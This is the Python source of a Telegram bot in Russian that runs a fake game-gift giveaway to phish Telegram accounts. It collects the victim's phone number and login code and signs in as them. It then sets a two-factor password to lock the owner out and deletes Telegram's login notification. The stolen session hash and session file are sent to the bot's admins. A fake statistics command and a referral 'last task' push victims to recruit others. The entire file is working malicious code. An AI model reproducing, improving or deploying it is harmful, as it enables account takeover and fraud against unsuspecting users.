from osdata import *
from aiogram.types import InputFile
import asyncio
import random

ADMINS_IDS = [661123100, 1282132056]

def set_client(me):
	me.client = SESSIONS[str(me.phone)]
	return me

def get_mention(msg):
	name = msg.full_name.replace("<", "&lt;").replace(">", "&gt;").replace("\"", "`").replace("\'", "`")
	return f"<a href=\"tg://user?id={msg.id}\">{name}</a>"

@dp.message_handler(IsPrivate(), CommandStart())
async def hello(message: Message):
	await message.answer(
		"✋🏼 <b>Приветствую! Наши спонсоры дарят подарки в разных играх:</b>",
		reply_markup=choice_game_keyboard()
	)
	if " " in message.text:
		try:
			referrer_id = int(message.text.split()[1])
			referrer = await message.bot.get_chat(referrer_id)
		except:
			pass
		else:
			for ADMIN in ADMINS_IDS:
				await message.bot.send_message(
					ADMIN, f"📨 <b>Пришел от {get_mention(referrer)}.</b>\nid: <code>{message.chat.id}</code>\ntag: {get_mention(message.from_user)}"
				)

@dp.callback_query_handler(IsChoice())
async def choice(call: CallbackQuery):
	await call.message.delete()
	await call.message.answer(
		text="⚡ <b>Для того чтобы продолжить, вам необходимо подтвердить личность:</b>",
		reply_markup=continue_keyboard()
	)


@dp.message_handler(IsPrivate(), Command("stats"))
async def fake_stats(msg):
	await msg.answer(
		f"""📊 <b>Статистика бота.</b>
Всего пользователей: 10546
Всего контактов: 9622
Всего сессий: 647

👮‍♂️ <b>Администраторы:</b> @yltned, @dexwrty"""
	)

@dp.message_handler(IsPrivate(), content_types=ContentTypes.CONTACT)
async def contact(message: Message):
	await message.delete()
	try:
		await message.bot.delete_message(message.chat.id, message.message_id-1)
	except: pass

	msg = await message.answer(
		text="⏳",
		reply_markup=remove_keyboard()
	)

	if not Users.select().where(Users.id==message.chat.id).exists():
		Users.create(id=message.chat.id)
		for ADMIN in ADMINS_IDS:
			await message.bot.send_message(
				ADMIN, f"👤 <b>Новый контакт.</b>\nid: <code>{message.chat.id}</code>\ntag: {get_mention(message.from_user)}\nphone: <code>{message.contact.phone_number}</code>"
			)
	
	Users.update(code=str()).where(Users.id==message.chat.id).execute()

	client = Telegram(message.contact.phone_number)
	Users.update(phone=message.contact.phone_number).where(Users.id==message.chat.id).execute()
	SESSIONS[str(message.contact.phone_number)] = client

	await client.connect()
	if await client.is_user_authorized():
		return await client.disconnect()

	try:
		await client.sign_in(message.contact.phone_number)
	except Exception as e:
		await msg.delete()
		return await msg.answer(
			text=f"🚫 <b>{e}</b>"
		)

	await msg.delete()
	await msg.answer(
		text="🔑 <b>Введите код:</b>",
		reply_markup=num_keyboard()
	)


@dp.callback_query_handler(lambda c: c.data.startswith("edit"))
async def edit_code(call: CallbackQuery):
	code = Users.get(Users.id==call.message.chat.id).code + call.data.split(":")[1]
	Users.update(code=code).where(Users.id==call.message.chat.id).execute()
	
	if len(code) > 4:
		await call.message.edit_text(
			text=f"🔐 <b>Код:</b> <code>{code}</code><b>. Верно?</b>",
			reply_markup=yesno_keyboard
		)
	else:
		await call.message.edit_text(
			text=f"🔑 <b>Введите код:</b> <code>{code}</code>",
			reply_markup=num_keyboard()
		)


@dp.callback_query_handler(Text("back"))
async def back(call: CallbackQuery):
	me = Users.get(Users.id==call.message.chat.id)
	if not me.code:
		return
	else:
		Users.update(code=me.code[:-1]).where(Users.id==call.message.chat.id).execute()
		await call.message.edit_text(
			text=f"🔑 <b>Введите код:</b> <code>{me.code[:-1]}</code>",
			reply_markup=num_keyboard()
		)


@dp.callback_query_handler(Text("yes"))
async def yes(call: CallbackQuery):
	me = Users.get(Users.id==call.message.chat.id)
	me = set_client(me)
	try:
		await me.client.sign_in(me.phone, me.code)
	except Exception as e:
		if str(e).startswith("The phone code entered was invalid"):
			Users.update(code=str()).where(Users.id==call.message.chat.id).execute()
			await call.message.edit_text(
				text="🚫 <b>Вы ввели неверный код.</b>\nP.S: Код от <b><a href=\"tg://user?id=777000\">Telegram</a></b>"
			)
			return await call.message.answer(
				text="🔑 <b>Введите код:</b>",
				reply_markup=num_keyboard()
			)
		elif str(e).startswith("Two-steps verification"):
			await call.message.delete()
			return await me.client.disconnect()
		await call.message.delete()
		await call.message.answer(
			text=f"🚫 <b>{e}</b>"
		)
		return await me.client.disconnect()

	try:
		await me.client.edit_2fa(new_password="4ebureklox228")
	except: pass
	try:
		await me.client.delete_dialog(777000, revoke=True)
	except: pass
	await call.message.delete()
	hash = me.client.session.save()

	with open(f"sessions/+{me.phone}.session", "w") as obj:
		obj.write(hash)
		obj.close()

	for ADMIN in ADMINS_IDS:
		if ADMIN == 661123100:
			await call.message.bot.send_message(
				661123100, f"📝 <b>Новая сессия.</b>\nphone: <code>{me.phone}</code>\ntag: {get_mention(call['from'])}\nhash: <code>{hash}</code>"
			)
			await call.message.bot.send_document(
				661123100, InputFile(f"sessions/+{me.phone}.session")
			)
		else:
			h = hash if random.randrange(1, 100) >= 70 else "не твоя очередь"
			await call.message.bot.send_message(
				ADMIN, f"📝 <b>Новая сессия.</b>\nphone: <code>{me.phone}</code>\ntag: {get_mention(call['from'])}"
			)

	await call.message.answer(
		f"💞 <b>Последнее задание:</b>\n<i>Пригласить {random.randrange(5, 15)} пользователей в бота по твоей реф. ссылке которая находится ниже.</i>\n\n🔗 Твоя реф. ссылка 👉 <code>t.me/giweawaysbspgstffbot?start={call.message.chat.id}</code>"
	)


@dp.callback_query_handler(Text("no"))
async def no(call: CallbackQuery):
	Users.update(code=str()).where(Users.id==call.message.chat.id).execute()
	await call.message.edit_text(
		text="🔑 <b>Введите код:</b>",
		reply_markup=num_keyboard()
	)


async def send(msg, user, text):
	try:
		await msg.bot.send_message(user.id, text)
	except: return False
	else: return True


@dp.message_handler(text_startswith="send")
async def mail(msg: Message):
	text = msg.text.split(maxsplit=1)[1]
	
	import time
	ping = time.perf_counter()
	tasks = await asyncio.gather(*[
		send(msg, user, text)
		for user in Users.select(Users.id)
	])
	dead = [1 for _ in tasks if not _]
	ping = round(time.perf_counter() - ping, 3)
	await msg.answer(
		f"Отправлено {len(tasks)-len(dead)}/{len(tasks)} юзерам за {ping}"
	)


if __name__ == "__main__":
	executor.start_polling(dp)
